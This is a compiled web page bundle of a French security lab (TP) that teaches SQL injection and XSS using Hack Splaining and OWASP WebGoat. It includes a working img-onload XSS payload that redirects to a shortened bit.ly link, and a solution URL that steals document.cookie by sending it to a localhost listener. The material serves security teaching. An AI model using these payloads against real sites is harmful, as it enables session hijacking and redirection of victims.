import{_ as a,c as t,I as s,U as e,o as l,D as r}from"./chunks/framework.aGaNZw_P.js";const n="/assets/webgoat.Di5kaocb.png",o="/assets/webgoat-dom-injection-700x407.CbgKvcRh.png",x=JSON.parse('{"title":"TP Sécurité","description":"Le meilleur moyen de comprendre la sécurisation d’une application / site Internet, c’est de","frontmatter":{"description":"Le meilleur moyen de comprendre la sécurisation d’une application / site Internet, c’est de"},"headers":[],"relativePath":"tp/securite/index.md","filePath":"tp/securite/index.md","lastUpdated":1704121125000}'),u={name:"tp/securite/index.md"},p=e('<h1 id="tp-securite" tabindex="-1">TP Sécurité <a class="header-anchor" href="#tp-securite" aria-label="Permalink to &quot;TP Sécurité&quot;">​</a></h1><p>Le meilleur moyen de comprendre la sécurisation d’une application / site Internet, c’est de …</p><ul><li>Passer des heures sur de la théorie ?</li><li>Passer des heures sur du code à vous ?</li><li>Passer des heures à tenter des intrusions ?</li><li>La réponse D ?</li></ul><h2 id="partie-1-les-injections-sql" tabindex="-1">Partie 1 : Les injections SQL <a class="header-anchor" href="#partie-1-les-injections-sql" aria-label="Permalink to &quot;Partie 1 : Les injections SQL&quot;">​</a></h2><p>Avant d&#39;utiliser WebGoat, nous allons nous focaliser sur la partie Injection SQL, pour ça nous allons utiliser le site <a href="https://www.hacksplaining.com/exercises/sql-injection" target="_blank" rel="noreferrer">Hack Splaining</a>.</p><p>Celui-ci contient un bon « tutoriel » interactif permettant de tester et de se former au principe d’injections SQL.</p><h2 id="partie-2-les-xss-reflechies-stockees" tabindex="-1">Partie 2 : Les XSS Réfléchies / Stockées <a class="header-anchor" href="#partie-2-les-xss-reflechies-stockees" aria-label="Permalink to &quot;Partie 2 : Les XSS Réfléchies / Stockées&quot;">​</a></h2><p>Voilà un exemple simple de XSS via un input non filtré.</p>',8),c=e('<div class="danger custom-block"><p class="custom-block-title">Quoi faire ?</p><p>Ici, l&#39;idée, est de trouver comment éxécuter du code via un simple chargement d&#39;image ! Pour ça il faut connaître un peu le HTML et le fonctionnement des balises classique.</p><p>Une balise img, vous connaissez… Elle prend en paramètre un attribut <code>src</code>… ok ! Mais elle a également un autre attribut … nommé … <code>onload</code> cet attribut permet d&#39;éxécuter du code quand la ressource (l&#39;image) est chargé. Nous allons donc exploiter un code « mal écrit » pour charger du code JavaScript.</p><p>Pour ça, dans le champs de saisie, je vous propose de mettre:</p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span>https://fakeimg.pl/300/&quot; onload=&quot;alert(&#39;Coucou&#39;); window.location=&#39;https://bit.ly/3Bpiela&#39;&quot;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>Que-se passe-t-il ? Pourquoi ? Regardons le code source ensemble !</p></div><h3 id="_2-1-exploiter-la-faille" tabindex="-1">2.1 Exploiter la faille <a class="header-anchor" href="#_2-1-exploiter-la-faille" aria-label="Permalink to &quot;2.1 Exploiter la faille&quot;">​</a></h3><p>En partant du code précédent, afficher dans la page un formulaire en exploitant la faille <code>onload</code> du code fourni.</p><h3 id="_2-1-la-meme-chose-mais-par-lien" tabindex="-1">2.1 La même chose mais par lien… <a class="header-anchor" href="#_2-1-la-meme-chose-mais-par-lien" aria-label="Permalink to &quot;2.1 La même chose mais par lien…&quot;">​</a></h3><p>Vous l&#39;avez peut-être remarqué, dans le code JavaScript il est également possible de spécifier une image. Par exemple il est possible d&#39;écrire un lien :</p><ul><li><a href="https://cours.brosseau.ovh/demo/xss/index.html?uri=https://fakeimg.pl/600/" target="_blank" rel="noreferrer">https://cours.brosseau.ovh/demo/xss/index.html?uri=https://fakeimg.pl/600/</a></li></ul><p>Ce lien est source <strong>d&#39;un très grand danger</strong>, je vous propose de réfléchir à comment il serait possible d&#39;exploiter « le paramètre uri » afin de lui donner de détourner le comportement du site.</p><ul><li>Trouver un moyer de réaliser la même attaque que le code précédent (point 2.0).</li><li>Envoyer le lien à une autre personne.</li><li>Lire des données sur son ordinateur (nous allons le faire ensemble).</li></ul><p>C&#39;est à vous (enfin à nous).</p><details class="details custom-block"><summary>Solution</summary><ul><li><p><a href="https://cours.brosseau.ovh/demo/xss/index.html?uri=https://fakeimg.pl/300/%22%20onload=%22alert(%27Coucou%27);%20window.location=%27%3Chttps://bit.ly/3Bpiela%27%22%3E" target="_blank" rel="noreferrer">Exemple de solution (injection via lien)</a></p></li><li><p><a href="https://cours.brosseau.ovh/demo/xss/index.html?uri=https://fakeimg.pl/300/%22%20onload=%22document.body.insertAdjacentHTML(%27beforeend%27,%20%60%3Clink%20rel=%27stylesheet%27%20href=%27%3Chttp://localhost:8888/?v=$%7Bdocument.cookie%7D%27%20/%3E%3E%60)%22" target="_blank" rel="noreferrer">Exemple de vol de cookie</a></p></li></ul><p>Étudier le code JavaScript et le code HTML généré, pourquoi ça ne fonctionne pas ?</p></details><h2 id="partie-2-1-les-xss-stockees" tabindex="-1">Partie 2.1 : Les XSS Stockées <a class="header-anchor" href="#partie-2-1-les-xss-stockees" aria-label="Permalink to &quot;Partie 2.1 : Les XSS Stockées&quot;">​</a></h2><p>Pour mieux comprendre l&#39;aspect dangereux d&#39;une XSS nous allons utiliser Hack Splaining, pour ça rendez-vous sur <a href="https://www.hacksplaining.com/exercises/xss-stored" target="_blank" rel="noreferrer">Hack Splaining</a></p><p>Celui-ci contient un bon « tutoriel » interactif permettant de tester et de se former au principe de XSS.</p><h2 id="partie-3-webgoat" tabindex="-1">Partie 3 : WebGoat <a class="header-anchor" href="#partie-3-webgoat" aria-label="Permalink to &quot;Partie 3 : WebGoat&quot;">​</a></h2><p><img src="'+n+'" alt="Superbe Logo" loading="lazy"></p><p>WebGoat est un outil didactique aux dimensions pédagogiques proposé par le groupe OWASP. Il s&#39;agit d&#39;une application WEB J2EE développée en Java et destinée à l&#39;enseignement de manière interactive.</p><p>Elle vise à familiariser l&#39;utilisateur aux technologies WEB (E.g: protocole HTTP, Encoding, AJAX), aux mécanismes du protocole HTTP et aux vulnérabilités qui peuvent en découler. Cet enseignement se fait au travers de différentes leçons, chacune abordant un concept particulier, détaillant un problème de sécurité donné avant de soumettre l&#39;utilisateur à une mise en pratique immédiate. Chaque leçon (JSP) présente sur l&#39;application comporte une vulnérabilité que l&#39;utilisateur peut identifier et tenter d&#39;exploiter (E.g: Injection SQL permettant de retrouver de fausses informations comme des numéros de cartes de crédit).</p><p>Voilà une liste des éléments que nous allons pouvoir « exploiter » dans WebGoat :</p><ul><li>Flux des contrôles d&#39;accès et authentification</li><li>Flux de gestion de session utilisateur</li><li>Cross-Site Scripting (XSS)</li><li>Injections</li><li>Parameter and Data Tampering</li><li>Buffer Overflows</li><li>Configuration et stockage de données (non sécurisée)</li><li>Sécurité AJAX</li></ul><p>Nous n’allons bien évidemment pas tous les faire, l’idée est d’en faire quelques-uns et si vous le souhaitez vous pourrez approfondir le sujet.</p><p><img src="'+o+'" alt="WebGoat" loading="lazy"></p><h2 id="telechargement" tabindex="-1">Téléchargement <a class="header-anchor" href="#telechargement" aria-label="Permalink to &quot;Téléchargement&quot;">​</a></h2><p>Deux versions existent :</p><ul><li>Le jar</li><li>Un containeur Docker</li></ul><p>Nous allons choisir la version Docker :</p><h2 id="lancement" tabindex="-1">Lancement <a class="header-anchor" href="#lancement" aria-label="Permalink to &quot;Lancement&quot;">​</a></h2><div class="language-sh vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">sh</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">docker</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> run</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 127.0</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.0.1:8080:8080</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 127.0</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.0.1:9090:9090</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -e</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> TZ=Europe/Amsterdam</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> webgoat/webgoat</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>C’est parti, vous pouvez maintenant aller sur <a href="http://127.0.0.1:8080/WebGoat" target="_blank" rel="noreferrer">http://127.0.0.1:8080/WebGoat</a></p><p>⚠️ Nous allons utiliser un outil intégrant des failles… Pour éviter tout risque pour votre machine, le mieux est de couper l’accès au réseau de votre ordinateur. ⚠️</p><h2 id="a-faire" tabindex="-1">À faire <a class="header-anchor" href="#a-faire" aria-label="Permalink to &quot;À faire&quot;">​</a></h2><ul><li>AJAX Security <ul><li>LAB: Client Side Filtering</li><li>LAB: DOM-Based cross-site scripting</li><li>Dangerous Use of Eval</li></ul></li><li>Concurrency <ul><li>Thread Safety Problems</li><li>Shopping Cart Concurrency Flaw</li></ul></li><li>Injection Flaws <ul><li>Command Injection (si vous souhaitez faire du MITM - Man In The Middle -)</li><li>Numeric SQL Injection</li><li>String SQL Injection</li></ul></li><li>Parameter Tampering <ul><li>Exploit Hidden Fields</li></ul></li></ul>',31);function d(h,m,g,b,f,k){const i=r("Sample");return l(),t("div",null,[p,s(i,{src:"xss"}),c])}const S=a(u,[["render",d]]);export{x as __pageData,S as default};
